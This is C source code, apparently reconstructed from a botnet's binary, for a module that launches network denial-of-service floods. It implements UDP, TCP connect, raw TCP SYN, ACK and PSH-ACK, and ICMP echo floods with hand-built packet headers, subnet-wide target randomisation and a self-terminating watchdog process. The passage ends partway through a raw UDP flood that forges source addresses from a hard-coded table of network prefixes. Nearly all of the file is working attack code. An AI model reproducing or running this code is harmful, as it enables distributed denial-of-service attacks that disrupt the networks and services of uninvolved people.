#include "flood.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0x4000
#endif

extern uint32_t prng_next(void);
extern void prng_seed(void);
extern int32_t prng_range(int32_t min, int32_t max);
extern void prng_hex(char *out, int32_t length);
extern void prng_bytes(void *out, int32_t length);

static uint16_t read_le16(const uint8_t *p)
{
    return (uint16_t)((uint16_t)p[0] | ((uint16_t)p[1] << 8));
}

static uint32_t read_le32(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static void write_le16(uint8_t *p, uint16_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
}

static void write_le32(uint8_t *p, uint32_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
    p[2] = (uint8_t)(value >> 16);
    p[3] = (uint8_t)(value >> 24);
}

static void write_be16(uint8_t *p, uint16_t value)
{
    p[0] = (uint8_t)(value >> 8);
    p[1] = (uint8_t)value;
}

static void write_be32(uint8_t *p, uint32_t value)
{
    p[0] = (uint8_t)(value >> 24);
    p[1] = (uint8_t)(value >> 16);
    p[2] = (uint8_t)(value >> 8);
    p[3] = (uint8_t)value;
}

static uint16_t swap16(uint16_t value)
{
    return (uint16_t)((value >> 8) | (value << 8));
}

static uint32_t swap32(uint32_t value)
{
    return (value >> 24) | ((value & 0x00ff0000u) >> 8) |
           ((value & 0x0000ff00u) << 8) | (value << 24);
}

uint16_t flood_checksum16(const void *data, int32_t length)
{
    const uint8_t *cursor = (const uint8_t *)data;
    uint32_t sum = 0;

    while (length > 1) {
        sum += read_le16(cursor);
        cursor += 2;
        length -= 2;
    }

    if (length == 1) {
        sum += cursor[0];
    }

    sum = (sum & 0xffffu) + (sum >> 16);
    return (uint16_t)(~(sum + (sum >> 16)) & 0xffffu);
}

uint16_t flood_tcp_checksum(const uint8_t *ipv4_header,
                            const uint8_t *tcp_segment,
                            uint32_t segment_length_network,
                            int32_t segment_length)
{
    const uint8_t *cursor = tcp_segment;
    int32_t remaining = segment_length;
    uint32_t tcp_sum = 0;

    while (remaining > 1) {
        tcp_sum += read_le16(cursor);
        cursor += 2;
        remaining -= 2;
    }

    if (remaining == 1) {
        tcp_sum += (uint32_t)cursor[0] << 8;
    }

    const uint32_t source = read_le32(ipv4_header + 12);
    const uint32_t destination = read_le32(ipv4_header + 16);
    uint32_t sum = (source & 0xffffu) + (source >> 16) +
                   (destination & 0xffffu) + (destination >> 16) +
                   segment_length_network + tcp_sum +
                   ((uint32_t)ipv4_header[9] << 8);

    while ((sum >> 16) != 0) {
        sum = (sum & 0xffffu) + (sum >> 16);
    }

    return (uint16_t)(~sum & 0xffffu);
}

uint32_t flood_write_tcp_timestamp(uint8_t *option)
{
    option[0] = 1;
    option[1] = 1;
    option[2] = 8;
    option[3] = 10;
    write_be32(option + 4, prng_next());

    const uint32_t second = prng_next();
    write_be32(option + 8, second);
    return second;
}

pid_t flood_spawn_watchdog(int32_t delay_seconds)
{
    const pid_t result = fork();
    if (result != 0) {
        return result;
    }

    (void)prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    (void)sleep((unsigned int)delay_seconds);
    (void)kill(getppid(), SIGKILL);
    exit(0);
}

static uint16_t random_port_if_zero(uint32_t port)
{
    if (port != 0) {
        return (uint16_t)port;
    }
    return (uint16_t)prng_range(0x400, 0xffff);
}

static struct sockaddr_in initial_destination(const Target *targets,
                                               uint32_t port)
{
    struct sockaddr_in destination;
    memset(&destination, 0, sizeof(destination));
    destination.sin_family = AF_INET;
    destination.sin_port = htons((uint16_t)port);
    destination.sin_addr.s_addr = inet_addr(targets[0].address);
    return destination;
}

static void bind_udp_source(int fd, uint16_t source_port)
{
    struct sockaddr_in local;
    memset(&local, 0, sizeof(local));
    local.sin_family = AF_INET;
    local.sin_port = htons(random_port_if_zero(source_port));
    /* The original deliberately ignores bind failure. */
    (void)bind(fd, (struct sockaddr *)&local, sizeof(local));
}

static uint32_t randomized_target_address(const Target *target)
{
    uint32_t address = swap32((uint32_t)inet_addr(target->address));

    if (target->prefix_length <= 31) {
        const uint32_t shift = (32u - (uint32_t)target->prefix_length) & 0xffu;
        const uint32_t mask = shift == 0 ? 0u :
            (shift < 32 ? ((1u << shift) - 1u) : UINT32_MAX);
        address |= prng_next() & mask;
    }

    return swap32(address);
}

static void initialize_ipv4(uint8_t *packet, uint8_t protocol,
                            uint16_t total_length, uint32_t destination)
{
    packet[0] = 0x45;
    write_be16(packet + 2, total_length);
    packet[6] = 0x40;
    packet[8] = 0x80;
    packet[9] = protocol;
    write_le32(packet + 12, g_local_address);
    write_le32(packet + 16, destination);
}

static void refresh_ipv4_checksum(uint8_t *packet)
{
    write_le16(packet + 10, 0);
    write_le16(packet + 10, flood_checksum16(packet, 20));
}

static uint16_t random_tcp_window(void)
{
    static const uint16_t windows[8] = {
        0x16d0, 0x2000, 0x3908, 0x4000,
        0x7210, 0x7d78, 0xfaf0, 0xffff
    };
    return windows[prng_next() & 7u];
}

int32_t flood_udp_hex(Target *targets, int32_t target_count,
                      int32_t watchdog_delay, uint32_t destination_port,
                      uint16_t source_port, uint16_t payload_length,
                      int32_t round_delay_us, const void *payload)
{
    const int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd == -1) {
        return -1;
    }

    bind_udp_source(fd, source_port);
    struct sockaddr_in destination = initial_destination(
        targets, destination_port != 0 ? destination_port :
                                       (uint32_t)prng_range(0x400, 0xffff));

    uint8_t *packet = (uint8_t *)calloc(0x5f8, 1);
    if (payload != NULL) {
        memcpy(packet, payload, payload_length);
    }

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        for (int32_t i = 0; i < target_count; ++i) {
            destination.sin_addr.s_addr = randomized_target_address(&targets[i]);

            const int32_t suffix = prng_range(1, 0x80);
            int32_t packet_length = (int32_t)payload_length + suffix;
            if (payload == NULL) {
                prng_hex((char *)packet, packet_length);
                packet_length += (int32_t)payload_length;
            } else {
                prng_hex((char *)packet + payload_length, suffix);
            }

            (void)sendto(fd, packet, (size_t)packet_length, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
        }

        if (round_delay_us != 0) {
            (void)usleep((useconds_t)round_delay_us);
        }
    }
}

int32_t flood_udp_bytes(Target *targets, int32_t target_count,
                        int32_t watchdog_delay, uint32_t destination_port,
                        uint16_t source_port, uint16_t payload_length,
                        int32_t round_delay_us, const void *payload)
{
    const int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd == -1) {
        return -1;
    }

    bind_udp_source(fd, source_port);
    struct sockaddr_in destination = initial_destination(
        targets, destination_port != 0 ? destination_port :
                                       (uint32_t)prng_range(0x400, 0xffff));

    uint8_t *packet = (uint8_t *)calloc(0x578, 1);
    uint32_t length = payload_length;
    if (payload == NULL) {
        if (length == 0) {
            length = (uint32_t)prng_range(0x200, 0x400);
        }
        prng_bytes(packet, (int32_t)length);
    } else {
        memcpy(packet, payload, length);
    }

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        for (int32_t i = 0; i < target_count; ++i) {
            destination.sin_addr.s_addr = randomized_target_address(&targets[i]);
            (void)sendto(fd, packet, length, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
        }

        if (round_delay_us != 0) {
            (void)usleep((useconds_t)round_delay_us);
        }
    }
}

void flood_tcp_connect(const char *target_address, int32_t watchdog_delay,
                       int32_t destination_port, uint16_t payload_length,
                       int32_t io_delay_us, const void *payload)
{
    struct sockaddr_in destination;
    memset(&destination, 0, sizeof(destination));
    destination.sin_family = AF_INET;
    destination.sin_port = htons((uint16_t)destination_port);
    destination.sin_addr.s_addr = inet_addr(target_address);

    uint8_t *data = (uint8_t *)calloc(0x578, 1);
    uint32_t length = payload_length;
    if (payload != NULL) {
        memcpy(data, payload, length);
    }

    (void)flood_spawn_watchdog(watchdog_delay);

    enum {
        STATE_OPEN = 0,
        STATE_WAIT_WRITABLE = 1,
        STATE_SEND = 2,
        STATE_CLOSE = 3
    } state = STATE_OPEN;

    int fd = -1;
    for (;;) {
        switch (state) {
        case STATE_OPEN:
            fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd == -1) {
                state = STATE_OPEN;
                break;
            }

            {
                const int flags = fcntl(fd, F_GETFL, 0);
                (void)fcntl(fd, F_SETFL, flags | O_NONBLOCK);
                errno = 0;
                const int connected = connect(
                    fd, (struct sockaddr *)&destination, sizeof(destination));

                if (connected == -1 && errno == EINPROGRESS) {
                    if (io_delay_us != 0) {
                        (void)usleep((useconds_t)io_delay_us);
                    }
                    state = STATE_WAIT_WRITABLE;
                } else {
                    state = STATE_CLOSE;
                }
            }
            break;

        case STATE_WAIT_WRITABLE:
        {
            fd_set writable;
            FD_ZERO(&writable);
            FD_SET(fd, &writable);
            struct timeval timeout;
            timeout.tv_sec = 1;
            timeout.tv_usec = 0;

            const int selected = select(fd + 1, NULL, &writable, NULL, &timeout);
            if (selected == 1) {
                int socket_error = 0;
                socklen_t error_length = sizeof(socket_error);
                if (getsockopt(fd, SOL_SOCKET, SO_ERROR,
                               &socket_error, &error_length) == 0 &&
                    socket_error == 0) {
                    state = STATE_SEND;
                    break;
                }
            }

            if (io_delay_us != 0) {
                (void)usleep((useconds_t)io_delay_us);
            }
            state = STATE_CLOSE;
            break;
        }

        case STATE_SEND:
            if (payload == NULL) {
                if (payload_length == 0) {
                    length = (uint32_t)prng_range(0x200, 0x400);
                }
                prng_bytes(data, (int32_t)length);
            }

            if (send(fd, data, length, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                state = STATE_CLOSE;
            }

            if (io_delay_us != 0) {
                (void)usleep((useconds_t)io_delay_us);
            }
            break;

        case STATE_CLOSE:
            (void)close(fd);
            state = STATE_OPEN;
            if (io_delay_us != 0) {
                (void)usleep((useconds_t)io_delay_us);
            }
            break;
        }
    }
}

int32_t flood_tcp_syn(Target *targets, int32_t target_count,
                      int32_t watchdog_delay, uint32_t destination_port,
                      uint16_t source_port, int32_t packet_delay_us)
{
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd == -1) {
        return -1;
    }

    int one = 1;
    const int option_result = setsockopt(fd, IPPROTO_IP, IP_HDRINCL,
                                         &one, sizeof(one));
    if (option_result == -1) {
        return option_result;
    }

    const uint16_t source = random_port_if_zero(source_port);
    struct sockaddr_in destination = initial_destination(targets, source);

    uint8_t *packet = (uint8_t *)calloc(0x3c + 1, 1);
    initialize_ipv4(packet, IPPROTO_TCP, 0x3c, destination.sin_addr.s_addr);
    write_le32(packet + 24, 1);
    packet[32] = 0xa0;
    packet[33] |= 0x02;

    packet[40] = 2;
    packet[41] = 4;
    packet[42] = 5;
    packet[43] = 0xb4;
    packet[44] = 1;
    packet[45] = 3;
    packet[46] = 3;
    packet[47] = 2;
    packet[48] = 4;
    packet[49] = 2;
    packet[50] = 8;
    packet[51] = 10;
    write_be32(packet + 52, prng_next());
    write_be32(packet + 56, 0);
    packet[60] = 0;

    const uint32_t actual_destination_port = destination_port != 0 ?
        destination_port : (uint32_t)prng_range(0x400, 0xffff);
    write_be16(packet + 22, (uint16_t)actual_destination_port);
    write_be16(packet + 20, source);
    write_be16(packet + 34, random_tcp_window());

    refresh_ipv4_checksum(packet);
    write_le16(packet + 36, 0);
    write_le16(packet + 36,
               flood_tcp_checksum(packet, packet + 20, 0x2800, 0x28));

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        for (int32_t i = 0; i < target_count; ++i) {
            write_le32(packet + 16, randomized_target_address(&targets[i]));
            refresh_ipv4_checksum(packet);

            (void)sendto(fd, packet, 0x3c, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
            if (packet_delay_us != 0) {
                (void)usleep((useconds_t)packet_delay_us);
            }
        }
    }
}

int32_t flood_icmp_echo(Target *targets, int32_t target_count,
                        int32_t watchdog_delay, int32_t destination_port,
                        uint16_t payload_length, int32_t packet_delay_us,
                        const void *payload)
{
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (fd == -1) {
        return -1;
    }

    int one = 1;
    const int option_result = setsockopt(fd, IPPROTO_IP, IP_HDRINCL,
                                         &one, sizeof(one));
    if (option_result == -1) {
        return option_result;
    }

    struct sockaddr_in destination = initial_destination(
        targets, (uint32_t)destination_port);

    uint8_t *packet = (uint8_t *)calloc(0x594, 1);
    uint32_t length = payload_length;
    if (payload == NULL) {
        if (length == 0) {
            length = (uint32_t)prng_range(0x200, 0x400);
        }
        prng_bytes(packet + 28, (int32_t)length);
    } else {
        memcpy(packet + 28, payload, length);
    }

    initialize_ipv4(packet, IPPROTO_ICMP, (uint16_t)(length + 0x1c),
                    destination.sin_addr.s_addr);
    write_le16(packet + 4, 1);
    packet[20] = 8;
    write_le16(packet + 24, 1);
    refresh_ipv4_checksum(packet);

    (void)flood_spawn_watchdog(watchdog_delay);

    uint32_t sequence = 0;
    for (;;) {
        write_be16(packet + 26, (uint16_t)sequence);
        write_le16(packet + 22, 0);
        write_le16(packet + 22,
                   flood_checksum16(packet + 20, (int32_t)length + 8));

        for (int32_t i = 0; i < target_count; ++i) {
            write_le32(packet + 16, randomized_target_address(&targets[i]));
            refresh_ipv4_checksum(packet);
            (void)sendto(fd, packet, length + 0x1c, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
            if (packet_delay_us != 0) {
                (void)usleep((useconds_t)packet_delay_us);
            }
        }

        ++sequence;
    }
}

/* sub_9ae8 */
int32_t flood_tcp_ack(Target *targets, int32_t target_count,
                      int32_t watchdog_delay, uint32_t destination_port,
                      uint16_t source_port, uint16_t payload_length,
                      int32_t packet_delay_us, const void *payload)
{
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd == -1) {
        return -1;
    }

    int one = 1;
    const int option_result = setsockopt(fd, IPPROTO_IP, IP_HDRINCL,
                                         &one, sizeof(one));
    if (option_result == -1) {
        return option_result;
    }

    const uint32_t actual_destination_port = destination_port != 0 ?
        destination_port : (uint32_t)prng_range(0x400, 0xffff);
    struct sockaddr_in destination = initial_destination(
        targets, actual_destination_port);

    uint8_t *packet = (uint8_t *)calloc(0x5b0, 1);
    uint32_t length = payload_length;
    if (payload == NULL) {
        if (length == 0) {
            length = (uint32_t)prng_range(0x200, 0x578);
        }
        prng_bytes(packet + 56, (int32_t)length);
    } else {
        memcpy(packet + 56, payload, length);
    }

    initialize_ipv4(packet, IPPROTO_TCP, (uint16_t)(length + 0x38),
                    destination.sin_addr.s_addr);
    packet[32] = 0x90;
    packet[33] |= 0x10;
    write_be16(packet + 22, (uint16_t)actual_destination_port);
    write_be16(packet + 34, random_tcp_window());

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        (void)flood_write_tcp_timestamp(packet + 40);
        write_be16(packet + 4, (uint16_t)prng_next());
        const uint32_t sequence = prng_next();
        write_be32(packet + 24, sequence);
        write_be32(packet + 28, sequence - length);
        write_be16(packet + 20, random_port_if_zero(source_port));

        refresh_ipv4_checksum(packet);
        write_le16(packet + 36, 0);
        const uint16_t tcp_length = (uint16_t)(length + 0x24);
        write_le16(packet + 36,
                   flood_tcp_checksum(packet, packet + 20,
                                      swap16(tcp_length), tcp_length));

        for (int32_t i = 0; i < target_count; ++i) {
            write_le32(packet + 16, randomized_target_address(&targets[i]));
            refresh_ipv4_checksum(packet);

            (void)sendto(fd, packet, length + 0x38, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
            if (packet_delay_us != 0) {
                (void)usleep((useconds_t)packet_delay_us);
            }
        }
    }
}

int32_t flood_tcp_push_ack(Target *targets, int32_t target_count,
                           int32_t watchdog_delay, uint32_t destination_port,
                           uint16_t source_port, uint16_t payload_length,
                           int32_t packet_delay_us, const void *payload)
{
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd == -1) {
        return -1;
    }

    int one = 1;
    const int option_result = setsockopt(fd, IPPROTO_IP, IP_HDRINCL,
                                         &one, sizeof(one));
    if (option_result == -1) {
        return option_result;
    }

    struct sockaddr_in destination = initial_destination(targets, 0);

    uint8_t *packet = (uint8_t *)calloc(0x5ac, 1);
    initialize_ipv4(packet, IPPROTO_TCP, 0, destination.sin_addr.s_addr);
    packet[32] = 0x80;
    packet[33] |= 0x18;
    write_le32(packet + 24, 1);
    write_le32(packet + 28, 1);

    (void)flood_write_tcp_timestamp(packet + 40);

    uint32_t length = payload_length;
    if (payload == NULL) {
        if (length == 0) {
            length = (uint32_t)prng_range(0x200, 0x400);
        }
        prng_bytes(packet + 0x29, (int32_t)length);
    } else {
        memcpy(packet + 0x29, payload, length);
    }

    write_be16(packet + 2, (uint16_t)(length + 0x34));
    write_le16(packet + 4, (uint16_t)prng_range(1, 0xffff));

    const uint32_t actual_destination_port = destination_port != 0 ?
        destination_port : (uint32_t)prng_range(0x400, 0xffff);
    destination.sin_port = htons((uint16_t)actual_destination_port);
    const uint16_t source = random_port_if_zero(source_port);
    write_be16(packet + 20, source);
    write_be16(packet + 22, (uint16_t)actual_destination_port);
    write_be16(packet + 34, random_tcp_window());

    refresh_ipv4_checksum(packet);
    write_le16(packet + 36, 0);
    const uint16_t tcp_length = (uint16_t)(length + 0x20);
    write_le16(packet + 36,
               flood_tcp_checksum(packet, packet + 20,
                                  swap16(tcp_length), tcp_length));

    (void)flood_spawn_watchdog(watchdog_delay);

    for (;;) {
        for (int32_t i = 0; i < target_count; ++i) {
            write_le32(packet + 16, randomized_target_address(&targets[i]));
            refresh_ipv4_checksum(packet);

            (void)sendto(fd, packet, length + 0x34, MSG_NOSIGNAL,
                         (struct sockaddr *)&destination, sizeof(destination));
            if (packet_delay_us != 0) {
                (void)usleep((useconds_t)packet_delay_us);
            }
        }
    }
}

static const uint32_t udp_source_prefixes[0x236] = {
    0x01180000u, 0x01300000u, 0x01320000u, 0x01380000u, 0x01440000u, 0x01500000u,
    0x01b40000u, 0x01bc0000u, 0x01c00000u, 0x01cc0000u, 0x0e100000u, 0x0e680000u,
    0x0e700000u, 0x0e860000u, 0x0e900000u, 0x0ecc0000u, 0x0ed00000u, 0x1b080000u,
    0x1b100000u, 0x1b328000u, 0x1b36e000u, 0x1b62e000u, 0x1b800000u, 0x1b940000u,
    0x1b980000u, 0x1bb80000u, 0x1bc00000u, 0x1be00000u, 0x24010000u, 0x24040000u,
    0x24100000u, 0x24200000u, 0x24280000u, 0x24300000u, 0x24380000u, 0x24600000u,
    0x24680000u, 0x246c0000u, 0x246f0000u, 0x24710000u, 0x24800000u, 0x24d40000u,
    0x24d48000u, 0x24d50000u, 0x24f80000u, 0x27400000u, 0x27800000u, 0x2a040000u,
    0x2a300000u, 0x2a340000u, 0x2a380000u, 0x2a3f0000u, 0x2a540000u, 0x2a580000u,
    0x2a610000u, 0x2a630000u, 0x2a640000u, 0x2ab00000u, 0x2ab80000u, 0x2aca0000u,
    0x2ae00000u, 0x2af20000u, 0x2af80000u, 0x31400000u, 0x31700000u, 0x3a100000u,
    0x3a2a0000u, 0x3a2c0000u, 0x3a300000u, 0x3a638000u, 0x3a900000u, 0x3ad00000u,
    0x3af00000u, 0x3af40000u, 0x3b200000u, 0x3b280000u, 0x3b2a0000u, 0x3b2c0000u,
    0x3b300000u, 0x3b53c000u, 0x3bac0000u, 0x3c000000u, 0x3ca00000u, 0x3cd00000u,
    0x3ceb0000u, 0x3cff0000u, 0x3d340000u, 0x3d800000u, 0x3d820000u, 0x3d840000u,
    0x3d860000u, 0x3d880000u, 0x3d900000u, 0x3d960000u, 0x3d990000u, 0x3d9a0000u,
    0x3d9c0000u, 0x3da00000u, 0x3da40000u, 0x3da60000u, 0x3da80000u, 0x3dae0000u,
    0x3db00000u, 0x3df00000u, 0x3df14000u, 0x3df18000u, 0x3df1c000u, 0x3df28000u,
    0x3df30000u, 0x65100000u, 0x65400000u, 0x65480000u, 0x65cc0000u, 0x65f80000u,
    0x6a040000u, 0x6a080000u, 0x6a100000u, 0x6a200000u, 0x6a240000u, 0x6a280000u,
    0x6a2c0000u, 0x6a2e0000u, 0x6a380000u, 0x6a3c0000u, 0x6a3e0000u, 0x6a500000u,
    0x6a580000u, 0x6a5c0000u, 0x6a6c0000u, 0x6a700000u, 0x6a7a0000u, 0x6a7c0000u,
    0x6ae00000u, 0x6ae40000u, 0x6ae60000u, 0x6e060000u, 0x6e100000u, 0x6e340000u,
    0x6e480000u, 0x6e500000u, 0x6e580000u, 0x6e980000u, 0x6e9c0000u, 0x6ea60000u,
    0x6eb00000u, 0x6ee40000u, 0x6eec0000u, 0x6ef00000u, 0x6f000000u, 0x6f480000u,
    0x6f550000u, 0x6f700000u, 0x6f780000u, 0x6f7c0000u, 0x6f7e0000u, 0x6fa00000u,
    0x6faa0000u, 0x6fac0000u, 0x6fb00000u, 0x6fe00000u, 0x70000000u, 0x70420000u,
    0x70500000u, 0x70620000u, 0x70640000u, 0x706d8000u, 0x706f0000u, 0x70700000u,
    0x70740000u, 0x707a0000u, 0x70840000u, 0x70c00000u, 0x70e00000u, 0x71000000u,
    0x71080000u, 0x710c0000u, 0x71100000u, 0x71120000u, 0x71180000u, 0x71380000u,
    0x713a0000u, 0x713b0000u, 0x713e0000u, 0x71400000u, 0x71800000u, 0x71840000u,
    0x71880000u, 0x71c20000u, 0x71c80000u, 0x71cc0000u, 0x71d50000u, 0x71d54000u,
    0x71da0000u, 0x71dc0000u, 0x71e00000u, 0x71f00000u, 0x71f80000u, 0x72600000u,
    0x72680000u, 0x72870000u, 0x728a0000u, 0x72d80000u, 0x72e00000u, 0x73300000u,
    0x7355c000u, 0x73940000u, 0x73980000u, 0x73a80000u, 0x73ad0000u, 0x73c00000u,
    0x73e00000u, 0x74010000u, 0x74020000u, 0x74040000u, 0x74080000u, 0x74100000u,
    0x74340000u, 0x744e0000u, 0x745f0000u, 0x74700000u, 0x74740000u, 0x7480e000u,
    0x74810000u, 0x74820000u, 0x74840000u, 0x74870000u, 0x74880000u, 0x74900000u,
    0x74940000u, 0x74990000u, 0x749a0000u, 0x74a20000u, 0x74a30000u, 0x74a70000u,
    0x74a80000u, 0x74ab0000u, 0x74ac4000u, 0x74ac8000u, 0x74ae0000u, 0x74b00000u,
    0x74cf0000u, 0x74d00000u, 0x74f80000u, 0x74fc0000u, 0x74ff8000u, 0x75080000u,
    0x75150000u, 0x75160000u, 0x75180000u, 0x75200000u, 0x75280000u, 0x752c0000u,
    0x75390000u, 0x753c0000u, 0x75400000u, 0x75500000u, 0x75800000u, 0x76480000u,
    0x76500000u, 0x76540000u, 0x76582000u, 0x76584000u, 0x76588000u, 0x76700000u,
    0x76780000u, 0x767c0000u, 0x76b40000u, 0x76d40000u, 0x76d7c000u, 0x76ef0000u,
    0x76f80000u, 0x77000000u, 0x77040000u, 0x771b4000u, 0x77240000u, 0x77270000u,
    0x77280000u, 0x77290000u, 0x77300000u, 0x773c0000u, 0x773e0000u, 0x77540000u,
    0x77588000u, 0x77600000u, 0x776c0000u, 0x77700000u, 0x77800000u, 0x77900000u,
    0x77a20000u, 0x77a40000u, 0x77b00000u, 0x77e98000u, 0x77f80000u, 0x78000000u,
    0x78200000u, 0x78280000u, 0x78410000u, 0x78440000u, 0x78482000u, 0x78c00000u,
    0x79080000u, 0x79100000u, 0x79200000u, 0x7934e000u, 0x79380000u, 0x793a0000u,
    0x793c0000u, 0x79cc0000u, 0x79e00000u, 0x79ff0000u, 0x7a040000u, 0x7a5a0000u,
    0x7a5b0000u, 0x7a600000u, 0x7a720000u, 0x7a880000u, 0x7a9c0000u, 0x7abc0000u,
    0x7ac00000u, 0x7ae00000u, 0x7af00000u, 0x7b040000u, 0x7b080000u, 0x7b340000u,
    0x7b600000u, 0x7b650000u, 0x7b800000u, 0x7b8a0000u, 0x7b900000u, 0x7b940000u,
    0x7b980000u, 0x7ba00000u, 0x7bb10000u, 0x7bb20000u, 0x7bb40000u, 0x7bb80000u,
    0x7be80000u, 0x7bf40000u, 0x7c064000u, 0x7c1f0000u, 0x7c420000u, 0x7c430000u,
    0x7c480000u, 0x7c580000u, 0x7c700000u, 0x7c800000u, 0x7c980000u, 0x7ca00000u,
    0x7ce00000u, 0x7cf08000u, 0x7d200000u, 0x7d238000u, 0x7d240000u, 0x7d280000u,
    0x7d400000u, 0x7d680000u, 0x7d700000u, 0x7dd30000u, 0x8baa0000u, 0x8bbd0000u,
    0x8bc80000u, 0x8bd00000u, 0x8c4b0000u, 0x8ce00000u, 0x8ced0000u, 0x8cf00000u,
    0x8cf30000u, 0x8cf90000u, 0x8cfa0000u, 0x8cff0000u, 0x90000000u, 0x90070000u,
    0x900c0000u, 0x90340000u, 0x907b0000u, 0x90ff0000u, 0x968a0000u, 0x96ff0000u,
    0x99000000u, 0x99030000u, 0x99220000u, 0x99240000u, 0x99630000u, 0x99650000u,
    0x99760000u, 0x9d000000u, 0xab080000u, 0xab220000u, 0xab240000u, 0xab280000u,
    0xab2c0000u, 0xab500000u, 0xab580000u, 0xab680000u, 0xab700000u, 0xabd00000u,
    0xaf000000u, 0xaf100000u, 0xaf1e0000u, 0xaf2a0000u, 0xaf2c0000u, 0xaf920000u,
    0xaf940000u, 0xaf980000u, 0xafa00000u, 0xafb88000u, 0xb45f8000u, 0xb4600000u,
    0xb4818000u, 0xb4820000u, 0xb4880000u, 0xb6200000u, 0xb6360000u, 0xb6540000u,
    0xb6580000u, 0xb6600000u, 0xb6800000u, 0xb6900000u, 0xb69d0000u, 0xb6c80000u,
    0xb6eca000u, 0xb6f00000u, 0xb7000000u, 0xb7400000u, 0xb75c0000u, 0xb7800000u,
    0xb7a00000u, 0xb7b80000u, 0xb7c00000u, 0xca604000u, 0xca608000u, 0xca610000u,
    0xca620000u, 0xca634000u, 0xca638000u, 0xca640000u, 0xca654000u, 0xca658000u,
    0xca660000u, 0xca680000u, 0xca6b0000u, 0xca6d8000u, 0xca6e0000u, 0xca8da000u,
    0xd2498000u, 0xd249c000u, 0xd24c2000u, 0xd35a0000u, 0xd35a8000u, 0xd35ae000u,
    0xd35b0000u, 0xd35b4000u, 0xd35b8000u, 0xd35be000u, 0xd35c0000u, 0xd35c8000u,
    0xd35cc000u, 0xd35d0000u, 0xd35da000u, 0xd35de000u, 0xd35ec000u, 0xd3614000u,
    0xd3618000u, 0xd361c000u, 0xd3668000u, 0xd3670000u, 0xd3880000u, 0xd394e000u,
    0xd39e0000u, 0xda000000u, 0xda020000u, 0xda040000u, 0xda080000u, 0xda100000u,
    0xda380000u, 0xda400000u, 0xda480000u, 0xda4c0000u, 0xda540000u, 0xda580000u,
    0xda620000u, 0xda688000u, 0xda68e000u, 0xda6bc000u, 0xdac80000u, 0xdb800000u,
    0xdb880000u, 0xdb8c0000u, 0xdb8d0000u, 0xdb900000u, 0xdb940000u, 0xdb960000u,
    0xdb968000u, 0xdb970000u, 0xdb978000u, 0xdb980000u, 0xdb9c0000u, 0xdb9e0000u,
    0xdb9e6000u, 0xdb9f0000u, 0xdca00000u, 0xdcb00000u, 0xdcb40000u, 0xdcb60000u,
    0xdcb80000u, 0xdcc00000u, 0xdcc06000u, 0xdcc08000u, 0xdcc10000u, 0xdcc24000u,
    0xdcc28000u, 0xdcc30000u, 0xdcc38000u, 0xdcc3c000u, 0xdcc50000u, 0xdcc5a000u,
    0xdcc5c000u, 0xdcc80000u, 0xdcc8a000u, 0xdcc8c000u, 0xdcc90000u, 0xdcca0000u,
    0xdccb0000u, 0xdccd0000u, 0xdcf88000u, 0xdcf94000u, 0xdcf98000u, 0xdcfa0000u,
    0xdd000000u, 0xdd058000u, 0xdd060000u, 0xdd080000u, 0xdd0c0000u, 0xdd0c8000u,
    0xdd0d0000u, 0xdd0e0000u, 0xdd820000u, 0xddb00000u, 0xddc00000u, 0xddc40000u,
    0xddc60000u, 0xddc70000u, 0xddc78000u, 0xddc7e000u, 0xddc80000u, 0xddd00000u,
    0xdde00000u, 0xdde80000u, 0xddec0000u, 0xde4a0000u, 0xde4c0000u, 0xde500000u,
    0xde840000u, 0xde880000u, 0xdea00000u, 0xdea80000u, 0xdeb00000u, 0xded00000u,
    0xdef00000u, 0xdf080000u, 0xdf400000u, 0xdf900000u, 0xdfc60000u, 0xdfd60000u,
    0xdfdc0000u, 0xdff00000u
};

int32_t flood_udp_raw(Target *targets, int32_t target_count,
                      int32_t watchdog_delay, uint32_t destination_port,
                      uint16_t source_port, uint16_t payload_length,
                      int32_t packet_delay_us, const void *payload)
{
    const int fd = socket(AF_INET, SOCK_RAW, 0xff);
    if (fd == -1) {
        return -1;
    }

    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1) {
        return close(fd);
    }

    const uint32_t actual_destination_port = destination_port != 0 ?
        destination_port : (uint32_t)prng_range(0x400, 0xffff);
    struct sockaddr_in destination = initial_destination(
        targets, actual_destination_port);

    uint8_t *packet = (uint8_t *)calloc(0x594, 1);
    if (packet == NULL) {
        return close(fd);
    }

    prng_seed();
    const uint32_t selector = prng_next();
    const uint32_t source = udp_source_prefixes[selector % 0x236u] |
                            (prng_next() & 0xffffu);

    initialize_ipv4(packet, IPPROTO_UDP, 0, destination.sin_addr.s_addr);
    write_be32(packet + 12, source);
    write_be16(packet + 20, random_port_if_zero(source_port));
